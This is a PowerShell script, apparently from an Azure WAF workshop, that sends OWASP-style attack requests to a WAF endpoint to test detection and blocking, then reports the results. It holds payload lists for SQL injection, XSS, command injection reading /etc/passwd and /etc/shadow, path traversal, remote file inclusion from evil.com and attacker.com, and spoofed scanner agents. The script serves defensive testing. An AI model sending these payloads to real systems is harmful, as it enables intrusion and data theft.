<#
.SYNOPSIS
    Generates simulated attack traffic against WAF-protected endpoints.

.DESCRIPTION
    Sends HTTP requests with OWASP Top 10 attack payloads to test WAF detection
    and prevention. Used in Labs 2, 5, 7, and 8.

.PARAMETER TargetUrl
    The URL of the WAF-protected endpoint (AppGW or Front Door).

.PARAMETER AttackType
    Type of attack to simulate. Use 'All' to run all attack types.

.PARAMETER Count
    Number of requests per attack type.

.EXAMPLE
    .\generate-traffic.ps1 -TargetUrl "http://waf-workshop-appgw-xxxx.eastus2.cloudapp.azure.com"
    .\generate-traffic.ps1 -TargetUrl "https://waf-workshop-endpoint.azurefd.net" -AttackType SQLi
    .\generate-traffic.ps1 -TargetUrl "http://myappgw.com" -AttackType RateLimit -Count 200
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$TargetUrl,

    [ValidateSet('All', 'SQLi', 'XSS', 'CommandInjection', 'PathTraversal', 'RFI', 'SessionFixation', 'ProtocolViolation', 'Scanner', 'Bot', 'RateLimit', 'Legitimate')]
    [string]$AttackType = 'All',

    [int]$Count = 5,
    [switch]$Verbose
)

$TargetUrl = $TargetUrl.TrimEnd('/')
$results = @()

function Send-Request {
    param(
        [string]$Url,
        [string]$Method = 'GET',
        [string]$Body = $null,
        [hashtable]$Headers = @{},
        [string]$Description
    )

    try {
        $params = @{
            Uri                = $Url
            Method             = $Method
            UseBasicParsing    = $true
            ErrorAction        = 'Stop'
            TimeoutSec         = 10
        }
        if ($Headers.Count -gt 0) { $params['Headers'] = $Headers }
        if ($Body) {
            $params['Body'] = $Body
            $params['ContentType'] = 'application/x-www-form-urlencoded'
        }

        $response = Invoke-WebRequest @params
        $status = $response.StatusCode
    } catch {
        $status = $_.Exception.Response.StatusCode.value__
        if (-not $status) { $status = "Error" }
    }

    $color = if ($status -eq 200) { 'Green' } elseif ($status -eq 403) { 'Red' } else { 'Yellow' }
    Write-Host "  [$status] $Description" -ForegroundColor $color

    return [PSCustomObject]@{
        Description = $Description
        StatusCode  = $status
        Url         = $Url
    }
}

# ============================================================
# Attack Payloads
# ============================================================

$attacks = @{

    # --- SQL Injection ---
    SQLi = @(
        @{ Path = "/?id=1 OR 1=1"; Desc = "SQLi: OR 1=1 in query string" }
        @{ Path = "/?id=1; DROP TABLE users--"; Desc = "SQLi: DROP TABLE" }
        @{ Path = "/?search=admin' UNION SELECT username,password FROM users--"; Desc = "SQLi: UNION SELECT" }
        @{ Path = "/?id=1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))"; Desc = "SQLi: CONVERT injection" }
        @{ Path = "/?q=1'; WAITFOR DELAY '0:0:5'--"; Desc = "SQLi: Time-based blind" }
        @{ Path = "/?user=admin'/*"; Desc = "SQLi: Comment injection" }
        @{ Path = "/?id=1 HAVING 1=1"; Desc = "SQLi: HAVING clause" }
    )

    # --- Cross-Site Scripting ---
    XSS = @(
        @{ Path = "/?q=<script>alert('XSS')</script>"; Desc = "XSS: Script tag" }
        @{ Path = "/?q=<img src=x onerror=alert(1)>"; Desc = "XSS: IMG onerror" }
        @{ Path = "/?q=<svg/onload=alert('xss')>"; Desc = "XSS: SVG onload" }
        @{ Path = "/?q=javascript:alert(1)"; Desc = "XSS: javascript: protocol" }
        @{ Path = "/?q=<body onload=alert(1)>"; Desc = "XSS: Body onload" }
        @{ Path = "/?name=<iframe src='javascript:alert(1)'>"; Desc = "XSS: Iframe injection" }
    )

    # --- Command Injection ---
    CommandInjection = @(
        @{ Path = "/?cmd=;cat /etc/passwd"; Desc = "CMDi: cat passwd" }
        @{ Path = "/?cmd=|ls -la"; Desc = "CMDi: pipe ls" }
        @{ Path = "/?file=;whoami"; Desc = "CMDi: whoami" }
        @{ Path = "/?q=`$(cat /etc/shadow)`"; Desc = "CMDi: subshell" }
        @{ Path = "/?input=;ping -c 10 127.0.0.1"; Desc = "CMDi: ping" }
    )

    # --- Path Traversal ---
    PathTraversal = @(
        @{ Path = "/?file=../../etc/passwd"; Desc = "Path Traversal: etc/passwd" }
        @{ Path = "/?file=..\..\windows\system32\drivers\etc\hosts"; Desc = "Path Traversal: hosts file" }
        @{ Path = "/?page=....//....//etc/passwd"; Desc = "Path Traversal: double encoding" }
        @{ Path = "/?doc=%2e%2e%2f%2e%2e%2fetc%2fpasswd"; Desc = "Path Traversal: URL encoded" }
        @{ Path = "/?file=/etc/shadow"; Desc = "Path Traversal: shadow file" }
    )

    # --- Remote File Inclusion ---
    RFI = @(
        @{ Path = "/?page=http://evil.com/shell.php"; Desc = "RFI: Remote PHP include" }
        @{ Path = "/?template=https://attacker.com/malware.js"; Desc = "RFI: Remote JS include" }
        @{ Path = "/?url=ftp://evil.com/payload"; Desc = "RFI: FTP scheme" }
    )

    # --- Session Fixation ---
    SessionFixation = @(
        @{ Path = "/?session_id=abcdef123456"; Desc = "Session Fixation: query param" }
        @{ Path = "/"; Desc = "Session Fixation: cookie"; Headers = @{ "Cookie" = "PHPSESSID=attackercontrolled123" } }
    )

    # --- Protocol Violations ---
    ProtocolViolation = @(
        @{ Path = "/"; Desc = "Protocol: Missing User-Agent"; Headers = @{ "User-Agent" = "" } }
        @{ Path = "/"; Desc = "Protocol: Missing Accept header"; Headers = @{ "Accept" = "" } }
        @{ Path = "/" + ("A" * 8192); Desc = "Protocol: Oversized URI" }
    )

    # --- Scanner Detection ---
    Scanner = @(
        @{ Path = "/"; Desc = "Scanner: Nikto UA"; Headers = @{ "User-Agent" = "Nikto/2.1.6" } }
        @{ Path = "/"; Desc = "Scanner: SQLMap UA"; Headers = @{ "User-Agent" = "sqlmap/1.5#stable" } }
        @{ Path = "/"; Desc = "Scanner: Nessus UA"; Headers = @{ "User-Agent" = "Nessus SOAP" } }
        @{ Path = "/"; Desc = "Scanner: DirBuster UA"; Headers = @{ "User-Agent" = "DirBuster-1.0-RC1" } }
        @{ Path = "/admin"; Desc = "Scanner: Admin page probe" }
        @{ Path = "/wp-login.php"; Desc = "Scanner: WordPress login probe" }
        @{ Path = "/.env"; Desc = "Scanner: .env file probe" }
        @{ Path = "/phpinfo.php"; Desc = "Scanner: phpinfo probe" }
    )

    # --- Bot Simulation ---
    Bot = @(
        @{ Path = "/"; Desc = "Bot: Python requests UA"; Headers = @{ "User-Agent" = "python-requests/2.28.0" } }
        @{ Path = "/"; Desc = "Bot: curl UA"; Headers = @{ "User-Agent" = "curl/7.88.0" } }
        @{ Path = "/"; Desc = "Bot: Scrapy UA"; Headers = @{ "User-Agent" = "Scrapy/2.8.0" } }
        @{ Path = "/"; Desc = "Bot: Empty UA"; Headers = @{ "User-Agent" = "" } }
        @{ Path = "/"; Desc = "Bot: Fake Googlebot"; Headers = @{ "User-Agent" = "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)" } }
    )

    # --- Legitimate Traffic ---
    Legitimate = @(
        @{ Path = "/"; Desc = "Legit: Homepage" }
        @{ Path = "/index.html"; Desc = "Legit: Index page" }
        @{ Path = "/?page=about"; Desc = "Legit: About page" }
        @{ Path = "/?search=azure+waf+workshop"; Desc = "Legit: Normal search" }
        @{ Path = "/"; Desc = "Legit: Chrome UA"; Headers = @{ "User-Agent" = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36" } }
    )
}

# ============================================================
# Execute
# ============================================================

$typesToRun = if ($AttackType -eq 'All') { $attacks.Keys } else { @($AttackType) }

# Special handling for rate limiting
if ($AttackType -eq 'RateLimit') {
    Write-Host "`n============================================================" -ForegroundColor Cyan
    Write-Host " Rate Limit Test: Sending $Count rapid requests" -ForegroundColor Cyan
    Write-Host "============================================================" -ForegroundColor Cyan

    for ($i = 1; $i -le $Count; $i++) {
        $result = Send-Request -Url "$TargetUrl/" -Description "Rate limit request #$i"
        $results += $result
        Start-Sleep -Milliseconds 50
    }

    $blocked = ($results | Where-Object { $_.StatusCode -eq 429 -or $_.StatusCode -eq 403 }).Count
    Write-Host "`nResults: $($results.Count) sent, $blocked blocked (rate limited)" -ForegroundColor Yellow
    return
}

foreach ($type in $typesToRun) {
    $payloads = $attacks[$type]
    if (-not $payloads) { continue }

    Write-Host "`n============================================================" -ForegroundColor Cyan
    Write-Host " Attack Type: $type ($($payloads.Count) payloads)" -ForegroundColor Cyan
    Write-Host "============================================================" -ForegroundColor Cyan

    foreach ($payload in $payloads) {
        $url = "$TargetUrl$($payload.Path)"
        $headers = if ($payload.Headers) { $payload.Headers } else { @{} }
        $body = $payload.Body

        for ($i = 1; $i -le $Count; $i++) {
            $result = Send-Request -Url $url -Description $payload.Desc -Headers $headers -Body $body
            $results += $result
        }
    }
}

# ============================================================
# Summary
# ============================================================
Write-Host "`n============================================================" -ForegroundColor Cyan
Write-Host " Summary" -ForegroundColor Cyan
Write-Host "============================================================" -ForegroundColor Cyan

$total = $results.Count
$passed = ($results | Where-Object { $_.StatusCode -eq 200 }).Count
$blocked = ($results | Where-Object { $_.StatusCode -eq 403 }).Count
$other = $total - $passed - $blocked

Write-Host "  Total requests:  $total" -ForegroundColor White
Write-Host "  Passed (200):    $passed" -ForegroundColor Green
Write-Host "  Blocked (403):   $blocked" -ForegroundColor Red
Write-Host "  Other:           $other" -ForegroundColor Yellow
Write-Host ""

if ($blocked -gt 0 -and $passed -eq 0) {
    Write-Host "  WAF is in PREVENTION mode - all attacks blocked!" -ForegroundColor Green
} elseif ($blocked -eq 0) {
    Write-Host "  WAF is in DETECTION mode or disabled - no requests blocked." -ForegroundColor Yellow
    Write-Host "  Check WAF logs in Log Analytics for detected threats." -ForegroundColor Yellow
} else {
    Write-Host "  Mixed results - some attacks blocked, some passed." -ForegroundColor Yellow
}
